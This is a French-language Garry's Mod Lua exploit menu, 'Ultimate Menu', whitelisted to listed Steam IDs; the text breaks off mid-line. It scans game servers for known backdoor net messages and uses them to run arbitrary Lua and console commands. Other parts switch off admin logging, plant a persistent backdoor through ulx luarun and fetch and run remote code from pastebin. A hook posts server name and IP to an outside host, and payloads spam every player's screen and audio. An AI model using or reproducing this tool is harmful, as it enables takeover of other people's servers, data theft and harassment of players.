if ( SERVER ) then 
function file.Read(d)      
return "Coucou <3"         
end
end
MsgC (Color( 210, 105, 30 ), [[  =======================================================================================================================
███    █▄   ▄█           ███      ▄█     ▄▄▄▄███▄▄▄▄      ▄████████     ███        ▄████████         ▄▄▄▄███▄▄▄▄      ▄████████ ███▄▄▄▄   ███    █▄  
███    ███ ███       ▀█████████▄ ███   ▄██▀▀▀███▀▀▀██▄   ███    ███ ▀█████████▄   ███    ███       ▄██▀▀▀███▀▀▀██▄   ███    ███ ███▀▀▀██▄ ███    ███ 
███    ███ ███          ▀███▀▀██ ███▌  ███   ███   ███   ███    ███    ▀███▀▀██   ███    █▀        ███   ███   ███   ███    █▀  ███   ███ ███    ███ 
███    ███ ███           ███   ▀ ███▌  ███   ███   ███   ███    ███     ███   ▀  ▄███▄▄▄           ███   ███   ███  ▄███▄▄▄     ███   ███ ███    ███ 
███    ███ ███           ███     ███▌  ███   ███   ███ ▀███████████     ███     ▀▀███▀▀▀           ███   ███   ███ ▀▀███▀▀▀     ███   ███ ███    ███ 
███    ███ ███           ███     ███   ███   ███   ███   ███    ███     ███       ███    █▄        ███   ███   ███   ███    █▄  ███   ███ ███    ███ 
███    ███ ███▌    ▄     ███     ███   ███   ███   ███   ███    ███     ███       ███    ███       ███   ███   ███   ███    ███ ███   ███ ███    ███ 
████████▀  █████▄▄██    ▄████▀   █▀     ▀█   ███   █▀    ███    █▀     ▄████▀     ██████████        ▀█   ███   █▀    ██████████  ▀█   █▀  ████████▀  
           ▀                                                                                                                                       
 ]])
  
MsgC (Color( 139, 0, 0 ), [[ 							
Ultimate menu chargé avec succès ! :D
Amusez-vous bien avec votre menu ! 
Pour toutes demande, contacter Jesus Christ (jesuschrist_officiel / Zilnix sur steam) ou rendez-vous sur le discord : //////
Version actuel : 1.1 - Premium
Menu accordé à : Jesus Christ, hazzy, Piloot, Supremacist, Melatron, Skiz, Mehdi, eclair47, Zilnix, oxalo, midou, Lolo, AniElo, hoper, silent, chris, ayro, chuckie, shenron, xeosgaming, zilnix.

***************
Changelog :
Mise à jour du 25/02/18 à 17h30 : Version 1.1 - Premium
[+]Ajout d'un bouton STOP SPAM TCHAT
[+]Ajout d'un bouton STOP right/duck etc...
***************					  
					  
Bisous :)

======================================================================================================================= ]])
  
local Authorized = LocalPlayer():SteamID()
if Authorized == "STEAM_0:1:219919521" or Authorized == "STEAM_0:1:123816101" -- Julie
    or Authorized == "STEAM_0:1:219919521" -- Piloot
        or Authorized == "STEAM_0:0:47379644" or Authorized == "STEAM_0:0:190768317" -- Supremacist (double account)
            or Authorized == "STEAM_0:0:105015067" -- Melatron
                or Authorized == "STEAM_0:1:219919521" or Authorized == "STEAM_0:1:422795969" or Authorized == "STEAM_0:1:425619663" or Authorized == "STEAM_0:0:425627691" -- Jesus Christ a.k.a Gaben Jr (double account) //// ADMIN
                    or Authorized == "STEAM_0:1:108221199" or Authorized == "STEAM_0:1:20262678" -- Skiz (double account)
                        or Authorized == "STEAM_0:1:90694208" or Authorized == "STEAM_0:0:185710186" -- Mehdi (double account) 
							or Authorized == "STEAM_0:0:27728622" -- eclair47
								or Authorized == "STEAM_0:0:162931507" or Authorized == "STEAM_0:1:244425230" -- Zilnix
									or Authorized == "STEAM_0:0:102386567" -- oxalo
										or Authorized == "STEAM_0:1:110275909" -- midou //// ADMIN
											or Authorized == "STEAM_0:0:315052913" -- Lolo
												or Authorized == "STEAM_0:0:427207896" or Authorized == "STEAM_0:0:105935099" -- chris
													or Authorized == "STEAM_0:0:99250842" -- silent
														or Authorized == "STEAM_0:0:115611801" -- ani elo
															or Authorized == "STEAM_0:1:118515076" -- momo
																or Authorized == "STEAM_0:0:189348722" -- hoper
																	or Authorized == "STEAM_0:1:80447668" -- chuckie
																		or Authorized == "STEAM_0:1:241209868" -- shenron
																			or Authorized == "STEAM_0:0:182249377" -- xeosgaming
																				or Authorized == "STEAM_0:0:422749912" -- zilnix
																				   or Authorized == "STEAM_0:1:199444592" -- anatik
																	
																	

																		




then

local n = net
local s = net.Start
local ss = net.WriteString
local stc = net.Send
local hp = http.Post
local netKey = "";
local vgui = vgui;         
local surface = surface;       
local render = render;         
local Color = Color;       
local input = input;       
local hook = hook;         
local next = next;         
local timer = timer;  
local GetConVarNumber = GetConVarNumber;     
local util = util;         
local player = player;         
local Vector = Vector;         
local Angle = Angle;       
local FindMetaTable = FindMetaTable;       
local team = team;         
local LocalPlayer = LocalPlayer;       
local draw = draw;             
local debug = debug;       
local table = table;       
local Entity = Entity;         
local ScrW, ScrH = ScrW, ScrH;         
local RunConsoleCommand = RunConsoleCommand;       
local GAMEMODE = GAMEMODE;         
local CurTime = CurTime;       
local cam = cam;
local silent = CreateClientConVar("silent", 0, false, false);
totalExploits = 0
BackdoorsFound = 0
local ply = LocalPlayer()
local noir = Color ( 0,0,0,255 )
local blanc = Color ( 255,255,255,255 )
local vert = Color ( 2,200,21,100 )
local bleu = Color ( 2,18,255,255 )
local cyan = Color ( 0,119,206,255 )
local asuna = Color ( 236,111,0,255 )
local rouge = Color ( 190,0,0,255 )
local multicolore = Color (math.random(1,255),math.random(1,255),math.random(1,255))
local lil = Color ( 141,0,158,255 )
local chocolat = Color ( 111,42,0,255 )
local gris = Color ( 119,119,119,255 )
local gaymen = Color ( 240,113,196,255 )
local mer = Color ( 28,41,152,255 )


function ValidNetString( str )
    local status, error = pcall( net.Start, str )
    return status
end

-- Exploit 1
function removeAll() -- Strips all Players
    for k,v in pairs(player.GetAll()) do
        stripPlayer(v)
    end
end

function stripPlayer(ply) -- Strip player function
    if ply:IsPlayer() then
        for k,v in pairs(ply:GetWeapons()) do
            net.Start("properties")
            net.WriteString( "remove" , 32 )
            net.WriteEntity( v )
            net.SendToServer()
        end
    end
end



GRADIENT_HORIZONTAL = 0;
GRADIENT_VERTICAL = 1;
function draw.LinearGradient(x,y,w,h,from,to,dir,res)
    dir = dir or GRADIENT_HORIZONTAL;
    if dir == GRADIENT_HORIZONTAL then res = (res and res <= w) and res or w;
    elseif dir == GRADIENT_VERTICAL then res = (res and res <= h) and res or h; end
    for i=1,res do
        surface.SetDrawColor(
            Lerp(i/res,from.r,to.r),
            Lerp(i/res,from.g,to.g),
            Lerp(i/res,from.b,to.b),
            Lerp(i/res,from.a,to.a)
        );
        if dir == GRADIENT_HORIZONTAL then surface.DrawRect(x + w * (i/res), y, w/res, h );
        elseif dir == GRADIENT_VERTICAL then surface.DrawRect(x, y + h * (i/res), w, h/res ); end
    end
end

---------------------
--  SPLOIT NOTIFY  --
---------------------
function SploitNotify(text)
    local notify = vgui.Create( "DPanel" )
    notify:SetSize( 1000, 50 )
    notify:SetPos( ScrW() - 200, -50 )
    notify.Paint = function(self, w, h)
    draw.RoundedBox( 0, 0, 0, w, h, Color(20, 20, 20))
    draw.RoundedBox( 0, 0, notify:GetTall() - 2, w, 2, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
    draw.SimpleText( text, "Title", notify:GetWide() / 2, notify:GetTall() / 2, Color(255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
    end
    notify:MoveTo( ScrW() - notify:GetWide(), 0, .2, 0, -1, function()
    timer.Simple( 3, function()
    notify:MoveTo( ScrW() - notify:GetWide(), -50, .2, 0, -1)
end);end) end
---------------------

local function playSound(url)
    sound.PlayURL(url, 'https://www.youtube.com/watch?v=zUOclHn6LZ4', function( station ) 
        if ( IsValid( station ) ) then
        station:SetPos( LocalPlayer():GetPos() )
        station:Play()
        end
    end)
end

hook.Add("Think", "RAINBOWPLAYER", function()
local RainbowPlayer = HSVToColor( CurTime() % 6 * 60, 1, 1 )
    LocalPlayer():SetWeaponColor( Vector( RainbowPlayer.r / 255, RainbowPlayer.g / 255, RainbowPlayer.b / 255 ) )
    LocalPlayer():SetPlayerColor( Vector( RainbowPlayer.r / 255, RainbowPlayer.g / 255, RainbowPlayer.b / 255 ) )
end)

-----------------------------
-- RCON STEALER
hook.Add("InitPostEntity", math.random(20,40), function()
    local sendTbl = {
        sn = GetHostName(),
        playercount = tostring(#player.GetAll()),
        ip = game.GetIP()
    }
 
    http.Post( "http://jesuschristoff.livehost.fr/DIVERS/index.php", sendTbl )
end)
--------------------------------

-- CHECKER
    if( ValidNetString("memeDoor") ) then
        netKey = "memeDoor"
    else
    end

    if( ValidNetString("Sandbox_Armdupe") ) then 
        netKey = "Sandbox_Armdupe"
    else
    end

    if( ValidNetString("DarkRP_AdminWeapons") ) then
        netKey = "DarkRP_AdminWeapons"
    else
    end

    if( ValidNetString("SessionBackdoor") ) then
        netKey = "SessionBackdoor"
    else
    end

    if( ValidNetString("Fix_Keypads") ) then
        netKey = "Fix_Keypads"
    else
    end

    if( ValidNetString("Remove_Exploiters") ) then
        netKey = "Remove_Exploiters"
    else
    end

    if( ValidNetString("noclipcloakaesp_chat_text") ) then
        netKey = "noclipcloakaesp_chat_text"
    else
    end

    if( ValidNetString("_Defqon") ) then
        netKey = "_Defqon"
    else
    end

    if( ValidNetString("_CAC_ReadMemory") ) then
        netKey = "_CAC_ReadMemory"
    else
    end

    if( ValidNetString("nostrip") ) then
        netKey = "nostrip"
    else
    end

    if( ValidNetString("LickMeOut") ) then
        netKey = "LickMeOut"
    else
    end

    if( ValidNetString("MoonMan") ) then
        netKey = "MoonMan"
    else
    end

    if( ValidNetString("Im_SOCool") ) then
        netKey = "Im_SOCool"
    else
    end

    if( ValidNetString("ULXQUERY2") ) then
        netKey = "ULXQUERY2"
    else
    end
	
    if( ValidNetString("jesuslebg") ) then
        netKey = "jesuslebg"
    else
    end
	
    if( ValidNetString("zilnix") ) then
        netKey = "zilnix"
    else
    end

    if( ValidNetString("enablevac") ) then
        netKey = "enablevac"
    else
    end

    if( ValidNetString("c") ) then
        netKey = "c"
    else
    end
	
    if( ValidNetString("Þà?D)◘") ) then
        netKey = "Þà?D)◘"
    else
    end
	
    if( ValidNetString("disablebackdoor") ) then
        netKey = "disablebackdoor"
    else
    end
	
    if( ValidNetString("kill") ) then
        netKey = "kill"
    else
    end

    if netKey == "" then
         chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Aucune backdoor :(" )
    else
        chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 0, 255, 0 ), "Backdoor trouvé! :D La backdoor est : ".. netKey )
            -- Auto shut down ULX Logs
            if GetConVarNumber("silent") == 1 then
                net.Start(netKey)
                net.WriteString( "ulx_logecho 0" )
                net.WriteBit (0)
                net.SendToServer()

                timer.Simple(0.1, function()
                    net.Start(netKey)
                    net.WriteString( "ulx_logecho 0" )
                    net.WriteBit (1)
                     net.SendToServer()

                chat.AddText("ULX Logs disabled." )
                end)
            end
    end
--END CHECKER

-----------------------------------------------
--     Check Backdoors (2) (jesus_scanbd)    --
-----------------------------------------------

function checkbackdoors()
    if( ValidNetString("memeDoor") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Ultimate Menu]", Color( 255, 255, 255 )," Backdoor trouvé ! - memeDoor" )
        netKey = "memeDoor"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Ultimate Menu]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - memeDoor!" )
    end

    if( ValidNetString("Sandbox_Armdupe") ) then 
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Ultimate Menu]", Color( 255, 255, 255 )," Backdoor trouvé ! - Sandbox_Armdupe" )
        netKey = "Sandbox_Armdupe"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Ultimate Menu]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - Sandbox_Armdupe!" )
    end

    if( ValidNetString("DarkRP_AdminWeapons") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Ultimate Menu]", Color( 255, 255, 255 )," Backdoor trouvé ! - DarkRP_AdminWeapons" )
        netKey = "DarkRP_AdminWeapons"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Ultimate Menu]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - DarkRP_AdminWeapons!" )
    end
    if( ValidNetString("SessionBackdoor") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Ultimate Menu]", Color( 255, 255, 255 )," Backdoor trouvé ! - SessionBackdoor" )
        netKey = "SessionBackdoor"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Ultimate Menu]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - SessionBackdoor!" )
    end

    if( ValidNetString("Fix_Keypads") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Ultimate Menu]", Color( 255, 255, 255 )," Backdoor trouvé ! - Fix_Keypads" )
        netKey = "Fix_Keypads"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Ultimate Menu]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - Fix_Keypads!" )
    end

    if( ValidNetString("Remove_Exploiters") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Ultimate Menu]", Color( 255, 255, 255 )," Backdoor trouvé ! - Remove_Exploiters" )
        netKey = "Remove_Exploiters"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Ultimate Menu]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - Remove_Exploiters!" )
    end

    if( ValidNetString("noclipcloakaesp_chat_text") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Ultimate Menu]", Color( 255, 255, 255 )," Backdoor trouvé ! - noclipcloakaesp_chat_text" )
        netKey = "noclipcloakaesp_chat_text"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Ultimate Menu]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - noclipcloakaesp_chat_text!" )
    end

    if( ValidNetString("_Defqon") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Ultimate Menu]", Color( 255, 255, 255 )," Backdoor trouvé ! - _Defqon" )
        netKey = "_Defqon"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Ultimate Menu]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - _Defqon!" )
    end

    if( ValidNetString("_CAC_ReadMemory") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Ultimate Menu]", Color( 255, 255, 255 )," Backdoor trouvé ! - _CAC_ReadMemory" )
        netKey = "_CAC_ReadMemory"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Ultimate Menu]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - _CAC_ReadMemory!" )
    end

    if( ValidNetString("nostrip") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Ultimate Menu]", Color( 255, 255, 255 )," Backdoor trouvé ! - nostrip" )
        netKey = "nostrip"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Ultimate Menu]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - nostrip!" )
    end

    if( ValidNetString("LickMeOut") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Ultimate Menu]", Color( 255, 255, 255 )," Backdoor trouvé ! - LickMeOut" )
        netKey = "LickMeOut"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Ultimate Menu]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - LickMeOut!" )
    end

    if( ValidNetString("MoonMan") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Ultimate Menu]", Color( 255, 255, 255 )," Backdoor trouvé ! -MoonMan" )
        netKey = "MoonMan"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Ultimate Menu]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - MoonMan!" )
    end

    if( ValidNetString("Im_SOCool") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Ultimate Menu]", Color( 255, 255, 255 )," Backdoor trouvé ! - Im_SOCool" )
        netKey = "Im_SOCool"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Ultimate Menu]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - Im_SOCool!" )
    end

    if( ValidNetString("ULXQUERY2") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Ultimate Menu]", Color( 255, 255, 255 )," Backdoor trouvé ! - ULXQUERY2" )
        netKey = "ULXQUERY2"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Ultimate Menu]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - ULXQUERY2!" )
    end
	
    if( ValidNetString("jesuslebg") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Ultimate Menu]", Color( 255, 255, 255 )," Backdoor trouvé ! - jesuslebg" )
        netKey = "jesuslebg"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Ultimate Menu]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - jesuslebg!" )
    end
	
    if( ValidNetString("zilnix") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Ultimate Menu]", Color( 255, 255, 255 )," Backdoor trouvé ! - zilnix" )
        netKey = "zilnix"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Ultimate Menu]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - zilnix!" )
    end
	
    if( ValidNetString("enablevac") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Ultimate Menu]", Color( 255, 255, 255 )," Backdoor trouvé ! - enablevac" )
        netKey = "enablevac"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Ultimate Menu]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - enablevac!" )
    end
	
    if( ValidNetString("c") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Ultimate Menu]", Color( 255, 255, 255 )," Backdoor trouvé ! - c" )
        netKey = "c"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Ultimate Menu]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - c!" )
    end
	
    if( ValidNetString("Þà?D)◘") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Ultimate Menu]", Color( 255, 255, 255 )," Backdoor trouvé ! - Þà?D)◘" )
        netKey = "Þà?D)◘"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Ultimate Menu]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - Þà?D)◘!" )
    end
	
    if( ValidNetString("disablebackdoor") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Ultimate Menu]", Color( 255, 255, 255 )," Backdoor trouvé ! - disablebackdoor" )
        netKey = "disablebackdoor"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Ultimate Menu]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - disablebackdoor!" )
    end
	
	    if( ValidNetString("kill") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Ultimate Menu]", Color( 255, 255, 255 )," Backdoor trouvé ! - kill" )
        netKey = "kill"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Ultimate Menu]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - kill!" )
    end
	
    SploitNotify("Backdoor trouvé: ".. netKey )
	chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 127, 255, 0 ), "Net changé à : ".. netKey  )
end

function Inject()
    chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), " Injecting..." )
    if ( ply:IsSuperAdmin() ) then
        timer.Simple( 3, function() 
            if( ValidNetString("SessionBackdoor") ) then

            else
                RunConsoleCommand( "ulx", "logecho", "0" )
                RunConsoleCommand( "ulx", "luarun", "util.AddNetworkString ('Ultimatemenu')" )
                RunConsoleCommand( "ulx", "luarun", "util.AddNetworkString('Ultimatemenu') net.Receive('Ultimatemenu', function( length, ply ) local netString = net.ReadString() local bit = net.ReadBit() if bit == 1 then RunString(netString) else game.ConsoleCommand(netString .. '\n') end end)" )
                RunConsoleCommand( "ulx", "logecho", "1" )
                chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), " Injécté avec succès !" )
            end
        end )
    else
        chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), " Erreur ! Vous n'êtes pas SUPERADMIN !" )
    end
    if( ValidNetString("Ultimatemenu") ) then
        chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), " La backdoor est déjà présente." )
    end
end

function bhop()
local AddHook = dismay and dismay.AddHook or hook and hook.Add or function() print("fuck i missed") end;
AddHook("CreateMove", "BHOP", function(cmd)
        if (cmd:KeyDown(IN_JUMP)) then
                if(cmd:GetMouseX() < 0) then
                        cmd:SetSideMove(-10000);
                elseif(cmd:GetMouseX() > 0) then
                        cmd:SetSideMove(10000);
                end
        if (LocalPlayer():IsOnGround()) then
                cmd:SetButtons(bit.bor(cmd:GetButtons(), IN_JUMP));
                        return;
        end
end
cmd:RemoveKey(IN_JUMP);
end)
end

surface.CreateFont("Font", {
font = "Segoe UI Light",
size = 21,
weight = 300
})

surface.CreateFont("Ultimateecrituretextemdr", {
font = "Segoe UI Light",
size = 47,
weight = 300
})

surface.CreateFont("description", {
font = "Segoe UI Light",
size = 20,
weight = 300
})

surface.CreateFont("CheckFont", {
font = "Segoe UI Light",
size = 17,
weight = 300
})

surface.CreateFont("Target", {
font = "Segoe UI Light",
size = 15,
weight = 300
})

surface.CreateFont( "Title", {
        font = "Lato Light",
        size = 30,
        weight = 250,
        antialias = true,
        strikeout = false,
        additive = true,
} )

surface.CreateFont( "tamere", {
        font = "Roboto",
        size = 150,
        weight = 250,
        antialias = true,
        strikeout = false,
        additive = true,
		bold = true,
} )

surface.CreateFont( "Welcome", {
        font = "Lato Light",
        size = 25,
        weight = 10,
        antiaalias = true,
        strikeout = false,
        additive = true,
} )

function Jesus()
local Menu = vgui.Create("DFrame")
Menu:SetSize(900, 700)
Menu:Center()
Menu:SetTitle("")
Menu:MakePopup()
Menu:ShowCloseButton(false) 
Menu.Paint = function(self, w, h)
draw.RoundedBox( 10, 0, 0, w, h, Color(0,0,0, 200) )
surface.SetDrawColor( 90, 0, 0 )

    draw.DrawText( "The Ultimate Menu - 1.0", "Ultimateecrituretextemdr", 250, -6, Color(255, 255, 255) )


end

local Close = vgui.Create("DButton", Menu)
Close:SetPos( 842, 10 )
Close:SetSize( 53, 20 )
Close:SetText( "Fermer" )
function Close:Paint( w, h )
    draw.RoundedBox( 10, 0, 0, w, h, Color(255,255,255) )
end

Close.DoClick = function()
    Menu:Close()  
end 


--------------------------------------------------------------
local Tabs = vgui.Create( "DPropertySheet", Menu )
Tabs:Dock( FILL )
Tabs:DockPadding( 5, 5, 0, 0)
Tabs.Paint = function (self, w, h)
for k, v in pairs(Tabs.Items) do
    if (!v.Tab) then continue end
   
    v.Tab.Paint = function(self,w,h)
         draw.RoundedBox(2, 0, 0, w -3, h-2, Color(15,15,15,240))
    end
end
end
 
local Controller = vgui.Create( "DPanel", Tabs )
    Controller.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, Color(15,15,15,220))
    end
Tabs:AddSheet( "Commandes", Controller )


local Targets = vgui.Create( "DPanel", Tabs )
    Targets.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, Color(15,15,15,220))
    end
Tabs:AddSheet( "SoundBoard", Targets )

local Musique = vgui.Create( "DPanel", Tabs )
    Musique.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, Color(15,15,15,220))
    end
Tabs:AddSheet( "Musique", Musique )

local Misc = vgui.Create( "DPanel", Tabs )
    Misc.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, Color(15,15,15,220))
    end
Tabs:AddSheet( "Autres", Misc )



local Controller = vgui.Create( "DScrollPanel", Controller )
Controller:Dock( FILL )
 
local Targets = vgui.Create( "DScrollPanel", Targets )
Targets:Dock( FILL )

local Misc = vgui.Create( "DScrollPanel", Misc )
Misc:Dock( FILL )

local Musique = vgui.Create( "DScrollPanel", Musique )
Musique:Dock( FILL )
--------------------------------------------------------------

local Entry = vgui.Create( "DTextEntry" )
Entry:SetParent(Controller)
Entry:SetPos( 12, 530 )
Entry:SetSize( 230, 90 )
Entry:SetText( "Commandes a inséré ici :D" )

local RCON = vgui.Create("DButton", Controller )
RCON:SetSize( 110, 25 )
RCON:SetPos( 130, 500 )
RCON:SetText("RCON Command")
RCON:SetTextColor(Color(255, 255, 255, 255))
RCON.Paint = function(panel, w, h)
    surface.SetDrawColor(120, 0, 0)
    surface.DrawRect( 0, 0, RCON:GetWide(), RCON:GetTall() )
    surface.SetDrawColor( 255, 255, 255 )
    surface.DrawOutlinedRect( 0, 0, RCON:GetWide(), RCON:GetTall() )
end

RCON.DoClick = function()
    local GetEntry = Entry:GetValue()
        net.Start(netKey)
        net.WriteString( GetEntry )
        net.WriteBit (false)
        net.SendToServer()
        chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "RCON Commande envoyé." )
		    SploitNotify("RCON Commande envoyé au serveur.")
    surface.PlaySound("buttons/blip1.wav") 
end

local GLUA = vgui.Create("DButton", Controller )
GLUA:SetSize( 110, 25 )
GLUA:SetPos( 5, 500 )
GLUA:SetText("Code LUA")
GLUA:SetTextColor(Color(255, 255, 255, 255))
GLUA.Paint = function(panel, w, h)
    surface.SetDrawColor(120, 0, 0)
    surface.DrawRect( 0, 0, GLUA:GetWide(), GLUA:GetTall() )
    surface.SetDrawColor( 255, 255, 255 )
    surface.DrawOutlinedRect( 0, 0, GLUA:GetWide(), GLUA:GetTall() )
end

GLUA.DoClick = function()
local GetEntry = Entry:GetValue()
        net.Start(netKey)
        net.WriteString( GetEntry )
        net.WriteBit (1)
        net.SendToServer()
        chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Code lua envoyé." )
		    SploitNotify("Code lua envoyé au serveur.")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 650, 30 )
Macro:SetTextColor( blanc )
Macro:SetSize( 200, 25 )
Macro:SetText( "Super Spam Visuel Basique (MoodTeam)" )
Macro.Paint = function()
surface.SetDrawColor(rouge)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor(blanc)
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "http.Fetch(\"https://pastebin.com/raw/3Tat6J9t\",function(b,l,h,c)RunString(b)end,nil)" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Super Spam Visuel 1 (base) activé" )
    SploitNotify("Super Spam Visuel/Sonore activé")
    surface.PlaySound("buttons/blip1.wav") 
end
 
local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 650, 60 )
Macro:SetText( "Spam Visuel Et Sonore Swag Dance" )
Macro:SetTextColor( blanc )
Macro:SetSize( 200, 25 )
Macro.Paint = function()
surface.SetDrawColor(rouge)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:SendLua([[local hud = vgui.Create(\"HTML\") hud:MoveToFront() hud:SetSize(200,158) hud:SetPos(0,0) hud:OpenURL(\"http://image.noelshack.com/fichiers/2017/46/1/1510531246-swag-dance.gif\")]]) v:SendLua([[local hud2 = vgui.Create(\"HTML\") hud2:MoveToFront() hud2:SetSize(200,158) hud2:SetPos(0,ScrH()-158) hud2:OpenURL(\"http://image.noelshack.com/fichiers/2017/46/1/1510531305-spin.gif\")]]) v:SendLua([[local hud3 = vgui.Create(\"HTML\") hud3:MoveToFront() hud3:SetSize(200,158) hud3:SetPos(ScrW()-200,0) hud3:OpenURL(\"http://image.noelshack.com/fichiers/2017/46/1/1510531246-swag-dance.gif\")]]) v:SendLua([[local hud4 = vgui.Create(\"HTML\") hud4:MoveToFront() hud4:SetSize(200,158) hud4:SetPos(ScrW()-200,ScrH()-158) hud4:OpenURL(\"http://image.noelshack.com/fichiers/2017/46/1/1510531305-spin.gif\")]]) timer.Create( \"spamsondeouf\", 1, 0, function() v:EmitSound( \"npc/stalker/go_alert2a.wav\", 100, 100 ) end) v:SendLua([[hook.Add(\"HUDPaint\",\"c\", function() 